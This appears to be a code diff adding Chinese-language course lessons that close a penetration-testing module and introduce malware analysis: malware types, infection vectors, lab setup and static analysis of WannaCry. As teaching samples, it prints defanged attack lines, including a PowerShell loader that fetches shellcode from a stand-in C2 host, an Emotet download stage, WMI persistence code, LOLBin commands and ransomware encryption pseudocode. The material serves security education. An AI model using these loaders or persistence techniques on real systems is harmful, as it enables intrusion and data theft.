修复建议和优先级\n\n3. 攻击路径叙述\n   - 从初始访问到最终目标的完整故事线\n   - 每一步使用的工具和技术\n   - 每个关键决策点的截图\n\n4. 修复路线图\n   - 短期修复（1-7天）：紧急漏洞\n   - 中期修复（1-3个月）：配置加固\n   - 长期修复（3-12个月）：架构改进\n\n5. 附录\n   - 测试授权书\n   - 工具清单\n   - 原始扫描数据\n   - 持久化机制清理清单</code></pre></div>\n\n<h2>本节小结</h2>\n\n<p>后渗透是将\"一次突破\"变为\"完全控制\"的关键阶段。我们学习了：</p>\n\n<ol>\n<li><strong>横向移动</strong>：PsExec、WMI、SSH、RDP 劫持——在内网中自由穿行</li>\n<li><strong>隧道与代理</strong>：SSH 隧道、Meterpreter 端口转发、chisel 反向隧道</li>\n<li><strong>持久化</strong>：SSH 后门、Cron Job、Systemd 服务、Windows 服务/计划任务/WMI</li>\n<li><strong>数据外传</strong>：HTTP、DNS 隧道、ICMP、分块加密</li>\n<li><strong>痕迹清理</strong>：日志清除、历史记录清理</li>\n<li><strong>报告编写</strong>：将技术发现转化为业务价值</li>\n</ol>\n\n<p>恭喜你完成了整个渗透测试模块！从侦察到报告，你已经掌握了一个完整渗透测试 engagements 所需的全部核心技能。记住：<strong>最好的渗透测试员，同时也是最好的防御者</strong>。理解了攻击，你才能更好地保护系统。</p>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>";
+
+SECTION_CONTENT["malw-01-01"] = "<div class=\"section-transition\"><p>渗透测试让我们学会了如何攻入系统。但当你发现一个可疑文件时，如何判断它是否是恶意软件？欢迎来到恶意软件分析实验室——在这里，我们将解剖历史上最危险的恶意代码。</p></div>\n\n<h2>分类与感染载体：恶意软件图鉴</h2>\n\n<p>2000年5月4日，全球数百万人打开电脑，看到一封标题为\"ILOVEYOU\"的邮件。好奇心驱使下，他们点开了附件——一个看似情书的VBScript文件。48小时内，这个蠕虫感染了超过5000万台电脑，造成超过100亿美元的经济损失。这就是恶意软件的力量：一段代码，足以撼动全球互联网。</p>\n\n<p>今天，你将学习如何系统性地识别和分类恶意软件。这不是纸上谈兵——我们会结合真实案例，从代码层面剖析每一种类型的恶意软件是如何工作的。</p>\n\n<h3>恶意软件分类学：不只是\"病毒\"那么简单</h3>\n\n<p>很多人把所有恶意软件都叫做\"病毒\"，这就像把所有动物都叫做\"狗\"一样不准确。作为分析师，你需要精确区分每一种类型，因为不同类型的分析方法和防御策略截然不同。</p>\n\n<div class=\"callout info\">\n<div class=\"callout-title\">核心分类框架</div>\n<p>恶意软件按照<strong>传播方式</strong>和<strong>恶意行为</strong>两个维度分类。传播方式决定它如何扩散（病毒、蠕虫、木马），恶意行为决定它做了什么（勒索、间谍、后门、Rootkit）。</p>\n</div>\n\n<h4>按传播方式分类</h4>\n\n<p><strong>病毒（Virus）</strong>：需要宿主文件，像生物病毒一样\"感染\"其他文件。经典的文件感染病毒会修改可执行文件的入口点，将控制权转移到恶意代码：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">┌─────────────────────────────────────┐\n│  被感染的 PE 文件                    │\n├─────────────────────────────────────┤\n│  DOS Header                         │\n│  PE Header                          │\n│  ┌───────────────────────────────┐  │\n│  │ .text (原始代码)               │  │\n│  │ Entry Point → JMP virus_entry │  │ ← 修改了入口点\n│  └───────────────────────────────┘  │\n│  ┌───────────────────────────────┐  │\n│  │ .vrsn (病毒新增节区)           │  │ ← 恶意代码藏在这里\n│  │ virus_entry:                   │  │\n│  │   pushad                       │  │\n│  │   call find_kernel32           │  │\n│  │   call find_files              │  │\n│  │   call infect_files            │  │\n│  │   popad                        │  │\n│  │   jmp original_entry           │  │ ← 执行完回原程序\n│  └───────────────────────────────┘  │\n└─────────────────────────────────────┘</code></pre></div>\n\n<p><strong>蠕虫（Worm）</strong>：不需要宿主，能够独立传播。还记得ILOVEYOU吗？它就是一个蠕虫。更近的例子——WannaCry利用SMB漏洞（MS17-010/EternalBlue）在网络中自动传播，2017年5月12日一天内感染了150多个国家的20万台电脑。</p>\n\n<p><strong>木马（Trojan）</strong>：伪装成合法软件的恶意程序。它不自我传播，而是靠社会工程学诱骗用户执行。Emotet就是近年来最成功的木马之一——它伪装成发票、快递通知等常见文档，感染后会将你变成僵尸网络的一部分。</p>\n\n<h4>按恶意行为分类</h4>\n\n<p><strong>勒索软件（Ransomware）</strong>：加密你的文件，然后要钱。WannaCry和NotPetya是最著名的例子。看一段典型的勒索软件加密逻辑：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 伪代码：勒索软件加密流程（仅供学习理解）\ndef ransomware_encrypt(file_path):\n    # 1. 生成随机 AES 密钥\n    aes_key = generate_random_key(256)\n    \n    # 2. 用 AES-256 加密文件内容\n    with open(file_path, 'rb') as f:\n        plaintext = f.read()\n    ciphertext = aes_encrypt(plaintext, aes_key)\n    \n    # 3. 用 RSA 公钥加密 AES 密钥（只有攻击者有私钥）\n    encrypted_aes_key = rsa_encrypt(aes_key, attacker_public_key)\n    \n    # 4. 写入加密文件 + 加密后的密钥\n    with open(file_path + '.locked', 'wb') as f:\n        f.write(encrypted_aes_key + ciphertext)\n    \n    # 5. 删除原文件\n    os.remove(file_path)</code></pre></div>\n\n<div class=\"callout warn\">\n<div class=\"callout-title\">警告</div>\n<p>上述代码仅用于理解勒索软件的工作原理。<strong>绝对不要</strong>在未经授权的系统上运行任何恶意代码，即使是你自己编写的测试版本。在我们的实验环境中，所有操作都在隔离的虚拟机内进行。</p>\n</div>\n\n<p><strong>后门（Backdoor）</strong>：给攻击者留下远程控制通道。Cobalt Strike的Beacon就是一个典型后门——它通过HTTP/HTTPS/DNS与C2服务器通信，等待攻击者的指令。</p>\n\n<p><strong>Rootkit</strong>：隐藏在操作系统深处，修改内核以隐藏自身。Stuxnet使用了Windows Rootkit技术来隐藏其USB传播组件。</p>\n\n<p><strong>间谍软件（Spyware）</strong>：窃取你的信息——键盘记录、截屏、摄像头拍照。APT组织（如APT29/Cozy Bear）经常使用定制间谍软件进行长期渗透。</p>\n\n<h4>新型威胁类别</h4>\n\n<p><strong>无文件恶意软件（Fileless Malware）</strong>：这是一类不写入磁盘的恶意软件，完全在内存中运行，利用系统自带的合法工具（\"Living off the Land\"，简称LOL）。这让传统的文件扫描几乎无法发现它：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">无文件攻击的典型技术栈:\n\n1. PowerShell 无文件攻击:\n   # 整个攻击链不写入任何文件到磁盘\n   # 攻击载荷完全在内存中执行\n   powershell -nop -exec bypass -w hidden -enc [base64]\n   \n   # Base64 解码后的载荷:\n   $wc = New-Object System.Net.WebClient\n   $shellcode = $wc.DownloadData(\"hxxp://c2[.]evil[.]com/sc.bin\")\n   \n   # 使用反射加载，不创建文件\n   [System.Reflection.Assembly]::Load($shellcode)\n   [Malware.Class]::Main()\n\n2. WMI 持久化 (Windows Management Instrumentation):\n   # 攻击者通过 WMI 事件订阅实现持久化\n   # 不创建注册表项、不创建服务、不写入文件\n   $filter = Set-WmiInstance -Class __EventFilter -Arguments @{\n       Name = \"SystemUpdate\"\n       EventNamespace = \"root\\cimv2\"\n       QueryLanguage = \"WQL\"\n       Query = \"SELECT * FROM __InstanceModificationEvent \n                WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' \n                AND TargetInstance.Secondary_SystemUpTime >= 200 \n                AND TargetInstance.Secondary_SystemUpTime < 320\"\n   }\n   # 每隔一段时间触发执行，完全隐藏在 WMI 仓库中\n\n3. LOLBins (Living off the Land Binaries):\n   # 使用 Windows 自带的合法工具执行恶意操作\n   certutil -decode payload.b64 payload.exe      ← 编码/解码\n   mshta vbscript:Execute(\"...\")                  ← HTML 应用\n   regsvr32 /s /n /u /i:url scrobj.dll            ← 脚本组件\n   rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication\"  ← DLL 代理</code></pre></div>\n\n<div class=\"callout warn\">\n<div class=\"callout-title\">无文件恶意软件的挑战</div>\n<p>无文件恶意软件对传统防御构成严峻挑战：<strong>没有文件可以扫描</strong>（绕过杀毒软件），<strong>使用合法工具</strong>（绕过白名单），<strong>仅存在于内存</strong>（重启后消失，但通过WMI/注册表实现持久化）。作为分析师，你需要关注内存取证和行为分析，而不仅仅是文件扫描。</p>\n</div>\n\n<p><strong>挖矿木马（Cryptominer）</strong>：利用你的算力为别人\"打工\"。2018年的Coinhive事件让无数网站在用户浏览器中偷偷挖掘门罗币（Monero）。企业环境中，挖矿木马会导致服务器CPU长期满载，电费飙升：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">挖矿木马的特征:\n\n典型挖矿木马 XMRig 配置文件:\n{\n    \"pools\": [\n        {\n            \"url\": \"stratum+tcp://pool.minexmr[.]com:4444\",\n            \"user\": \"45KgV...钱包地址...7Xz\",\n            \"pass\": \"worker1\",\n            \"algo\": \"rx/0\",           ← RandomX 算法（门罗币）\n            \"donate-level\": 0         ← 原版 XMRig 默认捐赠5%\n        }                               修改版设为0（盗版工具）\n    ],\n    \"cpu\": {\n        \"max-threads-hint\": 100       ← 使用全部 CPU 资源\n    }\n}\n\n检测特征:\n  - 持续高 CPU 使用率（>90%）\n  - 连接到 Stratum 协议端口 (3333, 4444, 5555, 14444)\n  - 进程名伪装为: svchost.exe, csrss.exe, conhost.exe\n  - 使用 --donate-level=0 参数（破解版标志）</code></pre></div>\n\n<p><strong>信息窃取器（Infostealer）</strong>：近年来增长最快的恶意软件类别。以RedLine Stealer为代表，它专门窃取浏览器保存的密码、Cookie、加密货币钱包、Discord令牌等敏感数据。2023年，RedLine成为暗网上最畅销的恶意软件之一，售价仅100美元：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">RedLine Stealer 窃取目标:\n\n浏览器数据:\n  ├── Chrome: Login Data, Cookies, Web Data, History\n  ├── Firefox: logins.json, cookies.sqlite, key4.db\n  ├── Edge: 同 Chrome（Chromium 内核）\n  └── Opera/Brave/Vivaldi: 同 Chrome\n\n加密货币钱包:\n  ├── MetaMask (浏览器扩展)\n  ├── Exodus (桌面钱包)\n  ├── Electrum (Bitcoin)\n  └── 浏览器中的助记词/私钥\n\n通信工具:\n  ├── Discord 令牌 (从 LevelDB 中提取)\n  ├── Telegram 会话文件\n  ├── Steam 凭证\n  └── FTP 客户端配置 (FileZilla, WinSCP)\n\n系统信息:\n  ├── 硬件信息 (CPU, GPU, RAM, 磁盘)\n  ├── 操作系统版本和语言\n  ├── IP 地址和地理位置\n  ├── 截图\n  └── 已安装软件列表\n\n所有数据打包后通过 HTTPS 上传到攻击者的 C2 服务器\n最终流向: 暗网市场 → 初始访问经纪人 → APT/RaaS 组织</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h3>感染载体：恶意软件如何找到你</h3>\n\n<p>了解了\"是什么\"，接下来是\"怎么来\"。恶意软件的传播方式直接决定了你的分析切入点。</p>\n\n<h4>鱼叉式钓鱼邮件：最常见的初始入口</h4>\n\n<p>根据Verizon的数据泄露报告，超过90%的安全事件始于一封钓鱼邮件。攻击者通常会发送带有恶意附件或链接的邮件：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">典型的恶意邮件附件分析：\n\n邮件主题: \"紧急：Q3财务报表需要您审批\"\n附件: \"Q3_报表.pdf.exe\" (双扩展名伪装)\n\n文件属性:\n  MD5:    a3f2b8c1d4e5f6a7b8c9d0e1f2a3b4c5\n  大小:   425,984 字节\n  类型:   PE32 executable (GUI) Intel 80386\n  \n导入表可疑项:\n  - URLDownloadToFileA    ← 从网络下载文件\n  - VirtualAlloc          ← 动态分配内存\n  - CreateRemoteThread    ← 注入其他进程\n  - CryptEncrypt          ← 加密操作\n\n字符串提取:\n  - \"hxxp://malware-c2[.]evil[.]com/payload\"\n  - \"cmd.exe /c powershell -enc \"\n  - \"%APPDATA%\\Microsoft\\Windows\\svchost.exe\"</code></pre></div>\n\n<h4>漏洞利用：无需用户交互的感染</h4>\n\n<p>与钓鱼邮件不同，漏洞利用可以在你毫无察觉的情况下感染系统。WannaCry使用的EternalBlue漏洞就是如此——它利用Windows SMB协议的缓冲区溢出，远程执行任意代码：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-c\">// EternalBlue (MS17-010) 漏洞原理简化\n// srvnet.sys 中的 SrvOs2FeaListSizeToNt 函数\n\n// 漏洞根源：整数溢出导致缓冲区分配不足\nNTSTATUS SrvOs2FeaListSizeToNt(PFEALIST fea_list, PULONG nt_size) {\n    ULONG calculated_size = 0;\n    \n    // 遍历 FEA 列表计算所需大小\n    for (i = 0; i < fea_list->cbList; ) {\n        PFEA current_fea = (PFEA)((char*)fea_list + i);\n        \n        // 这里没有检查溢出！\n        // 攻击者构造超大的 cbList 值\n        calculated_size += current_fea->cbName + current_fea->cbValue;\n        \n        i += sizeof(FEA) + current_fea->cbName + current_fea->cbValue;\n    }\n    \n    *nt_size = calculated_size;  // 返回了一个被溢出截断的小值\n    return STATUS_SUCCESS;\n    // 后续代码用这个小值分配缓冲区，导致堆溢出\n}</code></pre></div>\n\n<div class=\"callout info\">\n<div class=\"callout-title\">分析提示</div>\n<p>当你分析一个利用漏洞传播的恶意软件时，关注两个层面：<strong>漏洞利用载荷</strong>（shellcode，用于获取初始执行权限）和<strong>恶意载荷</strong>（实际执行恶意行为的代码）。它们的代码风格、加壳方式往往不同。</p>\n</div>\n\n<h4>USB 传播：物理介质的威胁</h4>\n\n<p>Stuxnet最著名的传播方式就是通过受感染的USB驱动器。它利用了Windows的LNK漏洞（CVE-2010-2568）——仅仅是<strong>在资源管理器中浏览USB内容</strong>，不需要打开任何文件，就能触发恶意代码执行：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">Stuxnet USB 传播链:\n\nUSB 驱动器内容:\n├── ~WTR4132.tmp          ← 加载器 DLL\n├── ~WTR4141.tmp          ← Rootkit 驱动\n├── Copy of Shortcut to.lnk   ← 恶意 LNK 文件\n├── Copy of Copy of Shortcut to.lnk\n└── (其他伪装文件)\n\n触发流程:\n1. 用户插入 USB → Windows 自动枚举文件\n2. 资源管理器显示 .lnk 文件 → 触发 LNK 解析漏洞\n3. 漏洞执行 ~WTR4132.tmp 中的 shellcode\n4. Shellcode 加载 Rootkit 驱动 (~WTR4141.tmp)\n5. Rootkit 隐藏 USB 上的恶意文件\n6. 恶意软件开始搜索 Siemens Step7 软件</code></pre></div>\n\n<h4>供应链攻击：信任链的断裂</h4>\n\n<p>SolarWinds Orion事件（2020年）是供应链攻击的教科书案例。攻击者入侵了SolarWinds的构建系统，在Orion软件的合法更新中植入了后门（SUNBURST）：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">SolarWinds 供应链攻击时间线:\n\n2019年9月     攻击者首次渗透 SolarWinds 构建环境\n2020年2月     SUNBURST 后门被注入到 Orion 更新包\n2020年3-5月   约 18,000 个组织下载了受感染的更新\n2020年12月    FireEye 披露发现入侵\n\nSUNBURST 后门行为:\n  - 伪装为合法的 SolarWinds.Orion.Core.BusinessLayer.dll\n  - 休眠 12-14 天后才开始活动\n  - 使用 DGA（域名生成算法）与 C2 通信\n  - 域名字段中编码了受害者的 AD 域名和 MAC 地址</code></pre></div>\n\n<div class=\"callout default\">\n<div class=\"callout-title\">思考</div>\n<p>供应链攻击之所以难以防御，是因为恶意代码通过合法渠道分发，带有合法的数字签名。这对我们分析师意味着：不能仅凭\"来源可信\"就排除恶意可能性。</p>\n</div>\n\n<h3>建立你的分析实验室</h3>\n\n<p>理论讲够了，是时候动手了。一个合格的恶意软件分析环境需要做到<strong>隔离</strong>（防止样本逃逸）和<strong>可观测</strong>（能监控所有行为）。</p>\n\n<h4>虚拟机环境搭建</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 推荐实验环境配置\n\n# 分析虚拟机 1：Windows 分析环境 (FLARE-VM)\n# 基于 Windows 10，预装了所有主流分析工具\n# 下载 FLARE-VM 安装脚本:\ngit clone https://github.com/mandiant/flare-vm.git\ncd flare-vm\n# 以管理员身份运行 PowerShell:\npowershell -ExecutionPolicy Bypass -File .\\installer.ps1\n\n# 分析虚拟机 2：Linux 分析环境 (REMnux)\n# 下载 REMnux 虚拟设备:\n# https://remnux.org/ (提供 OVA 文件直接导入)\n# 或使用安装脚本:\nwget https://REMnux.org/remnux-cli\nmv remnux-cli remnux\nchmod +x remnux\nsudo ./remnux install\n\n# 网络隔离配置 (VirtualBox):\n# 设置 → 网络 → 仅主机网络 (Host-Only)\n# 或者使用内部网络 (Internal Network)\n# 绝对不要使用桥接模式！</code></pre></div>\n\n<div class=\"callout warn\">\n<div class=\"callout-title\">安全第一</div>\n<p>恶意软件分析实验室的核心原则：<strong>永远不要在你的主机系统上分析恶意样本</strong>。即使是经验丰富的分析师也可能犯一个失误，导致样本逃逸。虚拟机快照是你最好的朋友——每次分析前创建一个干净快照，分析完直接回滚。</p>\n</div>\n\n<h4>必备工具清单</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">恶意软件分析工具箱:\n\n静态分析:\n  - PE-bear / CFF Explorer    → PE 文件结构分析\n  - Detect It Easy (DiE)      → 查壳/识别编译器\n  - Ghidra / IDA Pro          → 反汇编与逆向工程\n  - Strings / FLOSS           → 字符串提取（含反混淆）\n  - YARA                      → 模式匹配与规则检测\n\n动态分析:\n  - x64dbg / OllyDbg         → Windows 调试器\n  - Process Monitor (ProcMon) → 文件/注册表/网络监控\n  - Process Hacker            → 进程管理与内存查看\n  - Wireshark / Fiddler       → 网络流量捕获\n  - API Monitor               → API 调用追踪\n\n辅助工具:\n  - Regshot                   → 注册表快照对比\n  - Autoruns                  → 启动项分析\n  - Noriben                   → 自动化行为收集\n  - INetSim                   → 网络服务模拟</code></pre></div>\n\n<h3>案例分析：解构 Emotet 的感染链</h3>\n\n<p>让我们把所学知识整合起来，分析一个真实的Emotet样本的感染链。Emotet被称为\"恶意软件之王\"——它不仅是银行木马，还是其他恶意软件的\"分发平台\"。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">Emotet 感染链分析:\n\n阶段 1: 钓鱼邮件\n├── 附件: Invoice_20230415.xlsm (带宏的 Excel)\n├── 宏代码使用 XOR 混淆\n└── 宏执行后调用 PowerShell\n\n阶段 2: PowerShell 下载器\n├── 命令: powershell -w hidden -enc [base64]\n├── 解码后:\n│   $urls = @(\n│     \"hxxp://legit-site1[.]com/wp-admin/payload.exe\",\n│     \"hxxp://legit-site2[.]com/uploads/drop.exe\"\n│   )\n│   foreach($url in $urls){\n│     try{\n│       Invoke-WebRequest $url -OutFile $env:TEMP\\svc.exe\n│       break\n│     }catch{}\n│   }\n└── 下载 Emotet 主模块\n\n阶段 3: Emotet 持久化\n├── 复制自身到: %LOCALAPPDATA%\\Microsoft\\Windows\\[随机名].exe\n├── 创建注册表运行键:\n│   HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n│   值: [随机名] = [路径]\\[随机名].exe\n└── 创建计划任务作为备用持久化\n\n阶段 4: C2 通信\n├── 使用 HTTPS 与 C2 服务器通信\n├── 初始信标包含系统信息\n├── 等待下载第二阶段载荷\n└── 可能的第二阶段: TrickBot / Ryuk / Cobalt Strike</code></pre></div>\n\n<div class=\"callout success\">\n<div class=\"callout-title\">分析要点</div>\n<p>从Emotet的案例中，我们看到了多种感染载体的组合使用：钓鱼邮件（载体）→ 恶意宏（初始执行）→ PowerShell（下载器）→ 文件落地（持久化）。这就是现代恶意软件的典型特征——多层、多阶段、模块化。</p>\n</div>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>\n\n<h3>小结与展望</h3>\n\n<p>在这一节中，你学会了：</p>\n<ul>\n<li><strong>分类体系</strong>：按照传播方式（病毒/蠕虫/木马）和恶意行为（勒索/后门/Rootkit/间谍）两个维度对恶意软件进行分类</li>\n<li><strong>感染载体</strong>：钓鱼邮件、漏洞利用、USB传播、供应链攻击——每种载体都有不同的分析切入点</li>\n<li><strong>实验环境</strong>：使用FLARE-VM和REMnux搭建隔离的分析实验室</li>\n<li><strong>真实案例</strong>：从ILOVEYOU到Emotet，恶意软件在不断进化</li>\n</ul>\n\n<p>下一节，我们将正式进入分析实验室，学习<strong>静态分析</strong>和<strong>动态分析</strong>两大核心技术——如何在不运行样本的情况下了解它的行为，以及如何在安全的环境中观察它的真实活动。</p>\n\n<div class=\"checkpoint\" data-cp=\"2\"></div>";
+
+SECTION_CONTENT["malw-01-02"] = "<h2>静态与动态分析：解剖恶意代码的两把手术刀</h2>\n\n<p>2017年5月12日，英国NHS（国家医疗服务体系）的电脑屏幕一个接一个地变红。\"Oops, your files have been encrypted!\"——WannaCry勒索软件来了。面对这个紧急威胁，安全研究员Marcus Hutchins通过静态分析发现了一个\"Kill Switch\"域名，成功阻止了全球传播。</p>\n\n<p>这一节，你将学会Marcus使用的那些分析技术。我们将用两种方法解剖恶意软件：<strong>静态分析</strong>（不运行样本，像法医一样检查\"尸体\"）和<strong>动态分析</strong>（在安全环境中运行它，观察它的\"活体行为\"）。</p>\n\n<h3>静态分析：不动手也能看透本质</h3>\n\n<p>静态分析是你拿到样本后应该做的<strong>第一件事</strong>。为什么？因为它是安全的——你不执行恶意代码，就能获得大量信息。</p>\n\n<h4>第一步：文件指纹识别</h4>\n\n<p>每个文件都有独特的\"指纹\"。我们先计算哈希值，然后查询威胁情报平台：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 计算文件哈希（在 REMnux 上执行）\nmd5sum suspicious_sample.exe\n# 输出: 85c79d4f5a5b7e6c3d2a1b0e9f8a7b6c\n\nsha256sum suspicious_sample.exe\n# 输出: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n\n# 使用 VirusTotal CLI 查询（需要先配置 API key）\nvt file e3b0c44298fc1c149afbf4c8996fb924\n\n# 或者用 curl 直接查询:\ncurl -s \"https://www.virustotal.com/api/v3/files/{hash}\" \\\n  -H \"x-apikey: YOUR_API_KEY\" | python3 -m json.tool</code></pre></div>\n\n<div class=\"callout info\">\n<div class=\"callout-title\">提示</div>\n<p>如果哈希值在VirusTotal上已经有大量检测结果，你可以直接参考已有分析。但如果检测结果为0或很少——恭喜你，你可能发现了一个新变种，需要深入分析。</p>\n</div>\n\n<h4>第二步：PE 文件结构解剖</h4>\n\n<p>Windows可执行文件（PE格式）是恶意软件最常见的载体。理解PE结构是静态分析的基础：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">PE 文件结构全景图:\n\n偏移    内容                  分析关注点\n────    ────                  ──────────\n0x00    DOS Header            \"MZ\" 魔术字节\n0x3C    e_lfanew              指向 PE 头的偏移\n        PE Signature          \"PE\\0\\0\"\n        COFF Header           \n          Machine             0x14c = x86, 0x8664 = x64\n          NumberOfSections    节区数量\n          TimeDateStamp       编译时间（可伪造）\n        Optional Header\n          AddressOfEntryPoint 程序入口点 RVA ← 重要！\n          ImageBase           加载基址\n          Subsystem           2=GUI, 3=控制台\n          DataDirectory\n            Import Table      导入函数列表 ← 非常重要！\n            Export Table      导出函数（DLL分析）\n            Resource Table    嵌入的资源文件\n            Debug Directory   PDB 路径（可能泄露开发者信息）\n\n节区表 (Sections):\n  .text    → 可执行代码\n  .data    → 已初始化全局变量\n  .rdata   → 只读数据（常量、字符串）\n  .rsrc    → 资源（图标、对话框、版本信息）\n  .reloc   → 重定位表\n  UPX0/1   → UPX 加壳标记 ← 看到这个就要脱壳！</code></pre></div>\n\n<p>让我们用 <code>pefile</code>（Python库）来解析一个真实的WannaCry样本：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import pefile\nimport time\n\n# 加载 WannaCry 样本 (tasksche.exe)\npe = pefile.PE(\"wannacry_tasksche.exe\")\n\n# 基本信息\nprint(f\"[*] 入口点: 0x{pe.OPTIONAL_HEADER.AddressOfEntryPoint:08x}\")\nprint(f\"[*] 镜像基址: 0x{pe.OPTIONAL_HEADER.ImageBase:08x}\")\nprint(f\"[*] 编译时间: {time.ctime(pe.FILE_HEADER.TimeDateStamp)}\")\n\n# 提取导入表 —— 这能告诉我们样本能做什么\nprint(\"\\n[*] 导入表:\")\nfor entry in pe.DIRECTORY_ENTRY_IMPORT:\n    print(f\"  {entry.dll.decode()}\")\n    for imp in entry.imports:\n        print(f\"    - {imp.name.decode()}\")\n\n# 输出示例:\n# KERNEL32.dll\n#   - CreateFileA\n#   - WriteFile\n#   - LoadLibraryA\n#   - GetProcAddress\n#   - CreateProcessA\n#   - FindFirstFileA      ← 搜索文件\n#   - FindNextFileA       ← 遍历文件系统\n# ADVAPI32.dll\n#   - CryptEncrypt         ← 加密操作\n#   - RegSetValueExA       ← 写注册表\n#   - CreateServiceA       ← 创建服务\n# WININET.dll\n#   - InternetOpenA        ← 网络连接\n#   - InternetReadFile     ← 下载数据\n\n# 检查节区熵值 —— 高熵值意味着加壳或加密\nprint(\"\\n[*] 节区熵值:\")\nfor section in pe.sections:\n    name = section.Name.decode().rstrip('\\x00')\n    entropy = section.get_entropy()\n    print(f\"  {name}: {entropy:.2f}\", end=\"\")\n    if entropy > 7.0:\n        print(\" ← 高熵！可能已加壳/加密\")\n    elif entropy > 6.5:\n        print(\" ← 偏高，需要关注\")\n    else:\n        print()</code></pre></div>\n\n<div class=\"callout default\">\n<div class=\"callout-title\">熵值分析指南</div>\n<p>信息熵（Entropy）衡量数据的随机程度，范围0-8。正常PE文件的.text节区熵值通常在4.5-6.5之间。如果超过7.0，几乎可以确定存在加壳（如UPX）或加密。WannaCry的某些节区熵值高达7.8——因为它内嵌了加密的RSA密钥。</p>\n</div>\n\n<h4>第三步：字符串分析</h4>\n\n<p>字符串是静态分析中最简单但最有效的技术之一。即使是经过混淆的恶意软件，也常常会留下有用的字符串：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 基础字符串提取\nstrings -n 8 suspicious_sample.exe | head -50\n\n# 更智能的字符串提取 —— 使用 FLOSS（FireEye）\n# FLOSS 能自动提取被混淆的字符串（XOR、Base64等）\nfloss suspicious_sample.exe\n\n# 输出示例（WannaCry 字符串）:\n# ----- 普通字符串 -----\n# \"This program cannot be run in DOS mode.\"\n# \"Ooops, your files have been encrypted!\"\n# \"Send $300 worth of Bitcoin to following address\"\n# \"icacls . /grant Everyone:F /T /C /Q\"\n# \n# ----- FLOSS 提取的混淆字符串 -----\n# [Stack String] \"hxxp://www[.]iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com\"\n#   ↑ 这就是著名的 Kill Switch 域名！</code></pre></div>\n\n<p>Marcus Hutchins就是发现了这个域名——当恶意软件成功连接这个域名时，它会自行终止。他注册了这个域名，就阻止了WannaCry的全球传播。</p>\n\n<h4>第四步：反汇编与反编译</h4>\n\n<p>当字符串和导入表不够用时，我们需要深入汇编代码。使用Ghidra（NSA开源的逆向工具）：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">Ghidra 反编译示例 —— WannaCry Kill Switch 检查逻辑:\n\n// Ghidra 反编译输出 (C伪代码)\nvoid CheckKillSwitch(void) {\n    HINTERNET hInternet;\n    HINTERNET hConnect;\n    char *killswitch_domain;\n    \n    // 尝试连接 Kill Switch 域名\n    killswitch_domain = \"http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\";\n    hInternet = InternetOpenA(\"Mozilla/4.0\", 1, NULL, NULL, 0);\n    hConnect = InternetOpenUrlA(hInternet, killswitch_domain, NULL, 0, 0x84000000, 0);\n    \n    if (hConnect != NULL) {\n        // 域名可达 → 退出！不加密！\n        InternetCloseHandle(hConnect);\n        InternetCloseHandle(hInternet);\n        ExitProcess(0);    // ← Kill Switch 生效\n    }\n    \n    // 域名不可达 → 继续执行恶意行为\n    InternetCloseHandle(hInternet);\n    EncryptAllFiles();  // 开始加密\n}\n\n对应的 x86 汇编:\n  00401A20  push    0                    ; dwFlags = 0\n  00401A22  push    0                    ; lpszProxyBypass = NULL\n  00401A24  push    0                    ; lpszProxy = NULL\n  00401A26  push    1                    ; dwAccessType = DIRECT\n  00401A28  push    offset \"Mozilla/4.0\" ; lpszAgent\n  00401A2D  call    InternetOpenA\n  00401A32  test    eax, eax\n  00401A34  jz      short loc_401A60     ; 如果失败，跳过\n  00401A36  mov     [ebp-hInternet], eax\n  00401A39  push    0                    ; dwContext = 0\n  00401A3B  push    84000000h            ; dwFlags\n  00401A40  push    0                    ; dwHeadersLength = 0\n  00401A42  push    0                    ; lpszHeaders = NULL\n  00401A44  push    offset killswitch_url\n  00401A49  mov     ecx, [ebp-hInternet]\n  00401A4C  push    ecx\n  00401A4D  call    InternetOpenUrlA\n  00401A52  test    eax, eax             ; 连接成功？\n  00401A54  jz      short loc_401A60     ; 失败 → 继续加密\n  00401A56  push    eax\n  00401A57  call    InternetCloseHandle\n  00401A5C  push    0                    ; ExitCode = 0\n  00401A5E  call    ExitProcess          ; KILL SWITCH!</code></pre></div>\n\n<div class=\"checkpoint\" 